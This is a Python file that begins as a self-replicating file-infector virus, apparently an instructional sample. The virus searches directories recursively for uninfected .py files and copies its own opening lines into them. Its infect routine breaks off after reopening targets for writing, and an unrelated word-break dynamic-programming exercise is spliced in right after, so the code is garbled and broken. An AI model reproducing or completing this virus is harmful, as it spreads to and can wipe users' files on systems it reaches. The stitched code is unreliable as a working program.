#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
def wordBreak(s, dictionary):
     
    # create a dp table to store results of subproblems
    # value of dp[i] will be true if string s can be segmented
    # into dictionary words from 0 to i.
    dp = [False for i in range(len(s) + 1)]
 
    # dp[0] is true because an empty string can always be segmented.
    dp[0] = True
 
    for i in range(len(s) + 1):
        for j in range(i):
            if dp[j] and s[j: i] in dictionary:
                dp[i] = True
                break
     
    return dp[len(s)]
  
# driver code
dictionary = [ "mobile", "samsung", "sam", "sung", "man", "mango", "icecream", "and", "go", "i", "like", "ice", "cream" ]
 
dict = set()
for s in dictionary:
    dict.add(s)
 
if (wordBreak("ilikesamsung", dict)):
    print("Yes")
else :
    print("No")
 
if (wordBreak("iiiiiiii", dict)):
    print("Yes")
else:
    print("No")
 
if (wordBreak("", dict)):
    print("Yes")
else:
    print("No")
 
if (wordBreak("samsungandmango", dict)):
    print("Yes")
else:
    print("No")
 
if (wordBreak("ilikesamsung", dict)):
    print("Yes")
else:
    print("No")
 
if (wordBreak("samsungandmangok", dict)):
    print("Yes")
else:
    print("No")
 
# This code is contributed by shinjanpatra